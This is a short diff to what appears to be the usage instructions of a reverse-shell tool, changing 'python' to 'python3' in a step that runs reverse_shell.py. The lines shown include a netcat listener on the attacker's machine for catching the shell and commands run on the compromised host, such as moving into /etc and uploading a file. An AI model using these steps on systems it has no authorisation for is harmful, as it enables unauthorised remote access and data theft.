@@ -26,7 +26,7 @@ On the attacker's machine, set up a listener to receive the reverse shell connec
 
 ```sh
 nc -lvp YOUR_PORT
-python reverse_shell.py
+python3 reverse_shell.py
 whoami
 cd /etc
 upload test.txt
